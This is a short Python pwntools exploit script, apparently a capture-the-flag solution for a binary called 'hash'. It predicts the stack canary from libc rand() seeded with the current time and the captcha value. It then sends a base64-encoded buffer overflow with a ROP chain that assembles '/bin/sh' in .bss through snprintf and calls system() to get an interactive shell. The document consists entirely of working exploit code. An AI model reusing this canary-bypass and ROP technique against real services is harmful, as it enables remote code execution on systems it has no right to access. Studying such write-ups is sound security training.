from pwn import *
from base64 import b64encode
from ctypes import CDLL

def get_canary(captcha):
	a = [0] * 7
	libc.srand(libc.time(0)) # srand(time(null))
	libc.rand()
	for i in range(0, 7):
		a[i] = libc.rand()
	canary = captcha - (a[0] + a[1] - a[2] + a[3] + a[4] - a[5] + a[6])
	canary = canary & 0xffffffff
	return canary
 
elf = ELF('./hash')
libc = CDLL('libc.so.6')

r = remote('0', 9002)
print r.recvline()
data = r.recvline()
print data

captcha = int(data.split(' ')[6])
r.sendline(str(captcha)) #captcha send
print r.recvuntil('paste me!')
print r.recv()
canary = get_canary(captcha)

rop = ROP(elf)
rop.raw('A' * 512)
rop.raw(canary) # Canary
rop.raw(0) # SSP
rop.raw(0) # pop
rop.raw(0) # pop

binsh = '/bin/sh\x00'
for i in range(len(binsh)):
	rop.snprintf(elf.bss() + i, 2, next(elf.search(binsh[i])))

rop.system(elf.bss())
r.sendline(b64encode(rop.chain()))

r.interactive()
